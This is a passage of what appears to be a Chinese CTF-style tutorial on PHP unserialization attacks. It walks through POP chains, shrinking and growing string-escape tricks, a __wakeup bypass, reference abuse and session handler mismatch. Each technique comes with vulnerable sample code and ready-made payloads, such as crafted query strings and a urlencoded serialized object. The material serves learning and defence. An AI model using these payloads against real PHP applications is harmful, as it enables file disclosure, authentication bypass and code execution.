    private $var = 'flag.php';
}

class Show{
    public $source;
    public $str;
}

class Test{
    public $p;
}
$mod = new Modifier();
$test = new Test();
$test->p=$mod;
$show = new Show();
$show ->source = $show;
$show->str=$test;
echo serialize($show);
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**payload:**  </span><br></pre></td></tr></table></figure>
<p>?pop&#x3D;O:4:”Show”:2:{s:6:”source”;r:1;s:3:”str”;O:4:”Test”:1:{s:1:”p”;O:8:”Modifier”:1:{s:13:”%00Modifier%00var”;s:8:”flag.php”;}}}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">注意var为`private`,构造payload时要在类名前后加%00  </span><br><span class="line">## 字符串逃逸基础_减少</span><br></pre></td></tr></table></figure>
<?php
class A{
    public $v1 = "a";
}
echo serialize(new A());
//O:1:"A":1:{s:2:"v1";s:1:"a";}
$b = 'O:1:"A":1:{s:2:"v1";s:1:"a";s:2:"v2";N;}';
var_dump(unserialize($b));
//bool(false)成员属性数量不对
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![输出信息](https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230923170835.png)  </span><br></pre></td></tr></table></figure>
<p>$b &#x3D; ‘O:1:”A”:2:{s:2:”v1”;s:1:”a”;s:2:”v2”;N;}’;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将b中成员属性数量改为2则正常执行  </span><br><span class="line">若字符串长度不匹配，仍会显示bool(false)</span><br></pre></td></tr></table></figure>
<?php
class A{
    public $v1 = "a\"b";
}
echo serialize(new A());
//O:1:"A":1:{s:2:"v1";s:3:"a"b";}
$b = 'O:1:"A":2:{s:2:"v1";s:1:"a";s:2:"v2";N;}s:2:"v2";N;}';
var_dump(unserialize($b));
//正常执行
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">`&quot;`是字符还是格式符号，是由字符串长度3来判断的  </span><br><span class="line">在前面字符串没有问题的情况下，`;&#125;`是反序列化结束符，后面的字符串不影响反序列化的结果  </span><br><span class="line">正常是指：成员属性数量一致，成员属性名称长度一致，内容长度一致  </span><br><span class="line">**属性逃逸**</span><br><span class="line">一般在数据先经过serialize再经过unserialize，在这个中间反序列化的字符串变多或者变少的时候有可能存在反序列化属性逃逸。    </span><br></pre></td></tr></table></figure>
<?php
class A{
    public $v1 = "abcsystem()";
    public $v2 = '123';
}
$data = serialize(new A());
//$data: "O:1:"A":2:{s:2:"v1";s:11:"abcsystem()";s:2:"v2";s:3:"123";}"
$data = str_replace("system()","",$data);
//$data: "O:1:"A":2:{s:2:"v1";s:11:"abc";s:2:"v2";s:3:"123";}"
var_dump(unserialize($data));
//bool(false)
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str_replace把&quot;system()&quot;替换为&quot;空&quot;  </span><br><span class="line">**O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:11:&quot;&lt;u&gt;abc&quot;;s:2:&quot;v&lt;/u&gt;2&quot;;s:3:&quot;123&quot;;&#125;**  </span><br><span class="line">字符串缺失导致格式被破坏，识别11位以后原本应该是`&quot;`  </span><br><span class="line">能否通过修改v2的值“123”达到逃逸效果  </span><br><span class="line">**O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:11:&quot;&lt;u&gt;abc&quot;;s:2:&quot;v&lt;/u&gt;2&quot;;s:3:&quot;123&quot;;&#125;**  </span><br><span class="line">让前面的代码全部被？吃掉  </span><br><span class="line">**O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:&lt;u&gt;?&lt;/u&gt;:&quot;&lt;u&gt;abc&quot;;s:2:&quot;v2&quot;;s:3:&quot;&lt;/u&gt;123&quot;;&#125;**  </span><br><span class="line">然后通过修改字符串123补全格式，并使后面的字符串变成功能性代码  </span><br><span class="line">**O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:&lt;u&gt;?&lt;/u&gt;:&quot;&lt;u&gt;abc&quot;;s:2:&quot;v2&quot;;s:xx:&quot;&lt;/u&gt;;s:2:&quot;v3&quot;;N;&#125;**  </span><br><span class="line">xx的值为我们构造的字符串长度，则前面需要被吃掉20个字符  </span><br><span class="line">吃掉一个system()8个，加上abc最少要吃掉3个system()，一共吃掉27个字符，多吃掉7个,所以还需要在v2中补充7个字符  </span><br><span class="line">**O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:&lt;u&gt;27&lt;/u&gt;:&quot;&lt;u&gt;abc~~system()system()system()~~&lt;/u&gt;&quot;;s:2:&quot;v2&quot;;s:21:&quot;&lt;u&gt;1234567&quot;;s:2:&quot;v3&quot;;N;&#125;&lt;/u&gt;&quot;;&#125;**  </span><br><span class="line">**O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:&lt;u&gt;27&lt;/u&gt;:&quot;&lt;u&gt;abc&quot;;s:2:&quot;v2&quot;;s:21:&quot;1234567&lt;/u&gt;&quot;;s:2:&quot;v3&quot;;N;&#125;**  </span><br></pre></td></tr></table></figure>
<?php
class A{
    public $v1 = "abcsystem()system()system()";
    public $v2 = '1234567";s:2:"v3";s:3:"123";}';
}
$data = serialize(new A());
//$data: "O:1:"A":2:{s:2:"v1";s:27:"abcsystem()system()system()";s:2:"v2";s:29:"1234567";s:2:"v3";s:3:"123";}";}"
$data = str_replace("system()","",$data);
//$data: "O:1:"A":2:{s:2:"v1";s:27:"abc";s:2:"v2";s:29:"1234567";s:2:"v3";s:3:"123";}";}"
var_dump(unserialize($data));
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">运行得到结果：  </span><br><span class="line">![逃逸出v3](https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230923180717.png)  </span><br><span class="line">由此多逃逸出一个成员属性  </span><br><span class="line">使第一个字符串减少，吃掉有效代码，在第二个字符串构造代码  </span><br><span class="line">### 字符串逃逸减少例题</span><br></pre></td></tr></table></figure>
<?php
function filter($name){
    $safe=array("flag","php");
    $name=str_replace($safe,"hk",$name);
    return $name;
}
class test{
    var $user;
    var $pass;
    var $vip = false ;
    function __construct($user,$pass){
        $this->user=$user;
    $this->pass=$pass;
    }
}
$param=$_GET['user'];
$pass=$_GET['pass'];
$param=serialize(new test($param,$pass));
$profile=unserialize(filter($param));

if ($profile->vip){
    echo file_get_contents("flag.php");
}
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">目标：判断vip值是否为真  </span><br><span class="line">对$param值&#x27;user&#x27;进行安全性检查，filter把&quot;flag&quot;,&quot;php&quot;替换为&quot;hk&quot;，然后再反序列化</span><br><span class="line">1. 字符串过来后减少还是增多  </span><br><span class="line">2. 构造出关键成员属性序列化字符串：$vip = ture  </span><br><span class="line">3. 变少则判断吃掉的内容，并计算长度  </span><br></pre></td></tr></table></figure>
<?php
class test{
    var $user = "flag";
    var $pass = "2js56";
    var $vip = ture ;
}
echo serialize(new test());
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$user`和`$pass`的值先随便设置一下  </span><br></pre></td></tr></table></figure>
<p>O:4:”test”:3:{s:4:”user”;s:4:”flag<u>“;s:4:”pass”;s:5:”</u>2js56”;s:3:”vip”;b:1;}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag被替换成hk，字符串减少，吃完`&quot;;s:4:&quot;pass&quot;;s:5:&quot;`后，`$pass`的值2js56可控，字符串逃逸  </span><br><span class="line">目标代码：`&quot;;s:3:&quot;vip&quot;;b:1;&#125;`，但是又产生了新问题，`&quot;;s:4:&quot;pass&quot;;s:5:&quot;`被吃掉后，成员属性就会少一个，所以应该将将值2js56构造为`&quot;;s:4:&quot;pass&quot;;s:5:&quot;2js56&quot;;s:3:&quot;vip&quot;;b:1;&#125;`  </span><br><span class="line">所以我们真正要吃掉的字符串为`&quot;;s:4:&quot;pass&quot;;s:xx:&quot;`，xx是程序根据后面的$pass字符串长度自动生成的，而我们丢进去的长度明显是两位数，所以应该占两个长度。  </span><br><span class="line">flag-&gt;hk，吃一次少2个字符，要吃够19位最少要吃10次，多吃一位在后面补，所以最终`$pass`的值应该是`1&quot;;s:4:&quot;pass&quot;;s:5:&quot;2js56&quot;;s:3:&quot;vip&quot;;b:1;&#125;`，而在`user`中传10个flag字符串  </span><br></pre></td></tr></table></figure>
<?php
function filter($name){
    $safe=array("flag","php");
    $name=str_replace($safe,"hk",$name);
    return $name;
}
class test{
    var $user;
    var $pass;
    var $vip = false ;
    function __construct($user,$pass){
        $this->user=$user;
    $this->pass=$pass;
    }
}
$param='flagflagflagflagflagflagflagflagflagflag';
$pass='1";s:4:"pass";s:5:"2js56";s:3:"vip";b:1;}';
$param=serialize(new test($param,$pass));
//O:4:"test":3:{s:4:"user";s:40:"flagflagflagflagflagflagflagflagflagflag";s:4:"pass";s:41:"1";s:4:"pass";s:5:"2js56";s:3:"vip";b:1;}";s:3:"vip";b:0;}
echo filter($param);
//O:4:"test":3:{s:4:"user";s:40:"hkhkhkhkhkhkhkhkhkhk";s:4:"pass";s:41:"1";s:4:"pass";s:5:"2js56";s:3:"vip";b:1;}";s:3:"vip";b:0;}
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:  </span><br></pre></td></tr></table></figure>
<p>?user&#x3D;flagflagflagflagflagflagflagflagflagflag&amp;pass&#x3D;1”;s:4:”pass”;s:5:”2js56”;s:3:”vip”;b:1;}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">## 字符串逃逸基础_增多</span><br><span class="line">反序列化字符串增多逃逸：构造出一个逃逸成员属性  </span><br><span class="line">第一个字符串增多，吐出多余代码，把多余位代码构造成逃逸的成员属性</span><br></pre></td></tr></table></figure>
<?php
class A{
    public $v1 = 'ls';
    public $v2 = '123';
}
$data =  serialize(new A());
echo $data;
//O:1:"A":2:{s:2:"v1";s:2:"ls";s:2:"v2";s:3:"123";}
$data = str_replace("ls","pwd",$data);
echo $data;
//O:1:"A":2:{s:2:"v1";s:2:"pwd";s:2:"v2";s:3:"123";}
var_dump(unserialize($data));
//bool(false)
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str_replace把&quot;ls&quot;替换为&quot;pwd&quot;  </span><br><span class="line">字符增多，会把末尾多出来的字符挤出  </span><br><span class="line">思路：把吐出来的字符构造成功能性代码</span><br><span class="line">**O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:&lt;u&gt;xx&lt;/u&gt;:&quot;pwd&quot;;s:2:&quot;v3&quot;;s:2:&quot;666&quot;;&#125;&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;**  </span><br><span class="line">吐出`&quot;;s:2:&quot;v3&quot;;s:2:&quot;666&quot;;&#125;`使结构完整，并且`;&#125;`可以把反序列化结束掉，不再管后面的原功能性代码，增加的`&quot;;s:2:&quot;v3&quot;;s:2:&quot;666&quot;;&#125;`一共22位  </span><br><span class="line">一个ls转成pwd增加一位字符，所以需要22个ls转成pwd  </span><br></pre></td></tr></table></figure>
<p>O:1:”A”:2:{s:2:”v1”;s:66:”lslslslslslslslslslslslslslslslslslslslslsls”;s:2:”v3”;s:2:”666”;}”;s:2:”v2”;s:3:”123”;}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>O:1:”A”:2:{s:2:”v1”;s:66:”pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd”;s:2:”v3”;s:2:”666”;}”;s:2:”v2”;s:3:”123”;}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一个字符串增多，吐出多余代码，把多余位代码构造成逃逸成员属性</span><br><span class="line">### 字符串逃逸增多例题</span><br></pre></td></tr></table></figure>
<?php
highlight_file(__FILE__);
error_reporting(0);
function filter($name){
    $safe=array("flag","php");
    $name=str_replace($safe,"hack",$name);
    return $name;
}
class test{
    var $user;
    var $pass='daydream';
    function __construct($user){
        $this->user=$user;
    }
}
$param=$_GET['param'];
$param=serialize(new test($param));
$profile=unserialize(filter($param));

if ($profile->pass=='escaping'){
    echo file_get_contents("flag.php");
}
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">目标：判断是否`pass==&#x27;escaping&#x27;`  </span><br><span class="line">`$_GET[&#x27;param&#x27;]`获取值给`$param`，并放在实例化test里作为一个参数，实例化触发`__construct`赋值给`$user`  </span><br><span class="line">对`$param`值进行安全检查，filter把&quot;flag&quot;,&quot;php&quot;替换为&quot;hack&quot;，然后再反序列化  </span><br><span class="line">**字符串增多，把有效代码往外吐**  </span><br><span class="line">  </span><br><span class="line">1. 判断字符串过滤后减少还是增多</span><br><span class="line">2. 构造出关键成员属性序列化字符串</span><br><span class="line">3. 增多则判断一次吐出来多少个字符  </span><br><span class="line">  </span><br></pre></td></tr></table></figure>
<?class test{
    var $user='2js56';
//user的值可控
    var $pass='escaping';
}
echo serialize(new test());
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:5:&quot;2js56&lt;u&gt;&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&lt;/u&gt;**</span><br><span class="line">`$user`的值可控，向里面的字符串塞&#x27;php&#x27;，则会被替换成&#x27;hack&#x27;，字符串增多，会吐出字符串变成结构代码，一个&#x27;php&#x27;吐出一个字符  </span><br><span class="line">**&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;**  </span><br><span class="line">则需要吐出29个字符，所以需要29个php  </span><br></pre></td></tr></table></figure>
<p>user &#x3D; phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp”;s:4:”pass”;s:8:”escaping”;}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">则经过filter会变为：  </span><br></pre></td></tr></table></figure>
<p>O:4:”test”:2:{s:4:”user”;s:116:”hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack”;s:4:”pass”;s:8:”escaping”;}”;s:4:”pass”;s:8:”daydream”;}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：  </span><br></pre></td></tr></table></figure>
<p>?param&#x3D;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp”;s:4:”pass”;s:8:”escaping”;}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">## wakeup魔术方法绕过</span><br><span class="line">**漏洞产生原因：**  </span><br><span class="line">如果存在`__wakeup()`方法，调用unserialize()方法前则先调用`__wakeup()`方法，但是序列化字符串中表示对象属性个数大于真实的属性个数时，会跳过`__wakeup()`的执行  </span><br><span class="line">**版本限制：**  PHP5-5.6.25,PHP7-7.0.10</span><br></pre></td></tr></table></figure>
<p>O:4:”test”:2:{s:2:”v1”;s:6:”benben”;s:2:”v2”;s:3:”123”;}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">O:4:&quot;test&quot;:3:&#123;s:2:&quot;v1&quot;;s:6:&quot;benben&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>成员属性个数值位3，但后面实际只有v1和v2两个成员属性<br><strong>例题：</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class secret&#123;</span><br><span class="line">    var $file=&#x27;index.php&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($file)&#123;</span><br><span class="line">        $this-&gt;file=$file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        include_once($this-&gt;file);</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;file=&#x27;index.php&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">if (!isset($cmd))&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    if (preg_match(&#x27;/[oc]:\d+:/i&#x27;,$cmd))&#123;</span><br><span class="line">        echo &quot;Are you daydreaming?&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        unserialize($cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//sercet in flag.php</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>如果<code>$cmd</code>为空，显示源代码<br>如果不为空，进行正则表达，o:后面不能出现数字<br>目标：反序列化后，调用<code>__destruct()</code>，把file定义成flag.php输出<br><code>__wakeup()</code>在反序列化之前触发，<code>__destruct()</code>在反序列化之后触发，<code>__wakeup()</code>会把file值改成’index.php’</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class secret&#123;</span><br><span class="line">    var $file=&#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">echo serialize(new secret());</span><br><span class="line">O:6:&quot;secret&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>将成员属性写成2，就可以跳过<code>__wakeup()</code>，由于正则表达式限制了O:后面不能跟数字，所以加一个<code>+</code>,跳过正则表达式匹配</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们将其urlencode一下，避免<code>+</code>引起的错误<br><strong>payload:</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A%2B6%3A%22secret%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></pre></td></tr></table></figure>
<h2 id="引用的利用方式"><a href="#引用的利用方式" class="headerlink" title="引用的利用方式"></a>引用的利用方式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var $enter;</span><br><span class="line">    var $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;pass&#x27;])) &#123;</span><br><span class="line">    $pass = $_GET[&#x27;pass&#x27;];</span><br><span class="line">    $pass=str_replace(&#x27;*&#x27;,&#x27;\*&#x27;,$pass);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = unserialize($pass);</span><br><span class="line"></span><br><span class="line">if ($o) &#123;</span><br><span class="line">    $o-&gt;secret = &quot;*&quot;;</span><br><span class="line">    if ($o-&gt;secret === $o-&gt;enter)</span><br><span class="line">        echo &quot;Congratulation! Here is my secret: &quot;.$flag;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;Oh no... You can&#x27;t fool me&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else echo &quot;are you trolling?&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>最终目的：secret &#x3D;&#x3D;&#x3D; enter<br><code>$a</code>为反序列化<code>$pass</code>后的对象，且赋值secret &#x3D; “<em>“<br>思路：通过构造<code>$pass</code>的值pass使<code>$enter</code>&#x3D;</em><br>但是怎么样在不输入<code>*</code>的情况下，让<code>$enter</code>值变为<code>*</code>？<br>则构造序列化字符串，让<code>$enter</code>的值引用<code>$secret</code>的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var $enter;</span><br><span class="line">    var $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new just4fun();</span><br><span class="line">$a-&gt;enter = &amp;$a-&gt;secret;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>O:8:”just4fun”:2:{s:5:”enter”;N;s:6:”secret”;R:2;}</strong><br>R代表引用，2代表enter<br>相当于secret被enter引用了，而enter相当于是secret的一个别名，所以<code>secret === enter</code>  </p>
<h2 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h2><p>当<code>session_start()</code>被调用或者php.ini中<code>session.auto_start</code>为1时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为&#x2F;tmp）。<br>存储数据的格式有多种，常用的有三种<br>漏洞产生：写入格式和读取格式不一致<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230924032208.png" alt="存储格式">  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;2js56&#x27;] = $_GET[&#x27;lhq&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>?lhq&#x3D;linghuaqian</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2js56|s:11:&quot;linghuaqian&quot;;</span><br></pre></td></tr></table></figure>
<p>php:键名 + 竖线 + 经过serialize()函数序列化处理的值</p>
<p><strong>声明session存储格式为php_serialize</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;2js56&#x27;] = $_GET[&#x27;lhq&#x27;];</span><br><span class="line">$_SESSION[&#x27;b&#x27;] = $_GET[&#x27;b&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>?lhq&#x3D;linghuaqian&amp;b&#x3D;666</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:5:&quot;2js56&quot;;s:8:&quot;linghuaqian&quot;;s:1:&quot;b&quot;;s:3:&quot;666&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>php_serialize:经过serialize()函数序列化处理的数组<br><strong>声明session存储格式为php_binary</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;2js56&#x27;] = $_GET[&#x27;lhq&#x27;];</span><br><span class="line">$_SESSION[&#x27;b&#x27;] = $_GET[&#x27;b&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>?lhq&#x3D;linghuaqian&amp;b&#x3D;666</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">532js56s:11:&quot;linghuaqian&quot;;49bs:3:&quot;666&quot;;</span><br></pre></td></tr></table></figure>

<p><strong>PHP session反序列化漏洞：</strong><br>当网站序列化并存储session，与反序列化并读取session的方式不同，就可能导致session反序列化漏洞的产生。<br><strong>save.php:提交a以php_serialize格式保存</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;lhq&#x27;] = $_GET[&#x27;a&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>构造以下payload：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=|O:1:&quot;D&quot;:1:&#123;s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>此时存储的为：a:1:{s:3:”lhq”;s:39:”<u>|O:1:”D”:1:{s:1:”a”;s:10:”phpinfo();”;}</u>“;}</p>
<p><strong>vul.php:以php格式读取session</strong></p>
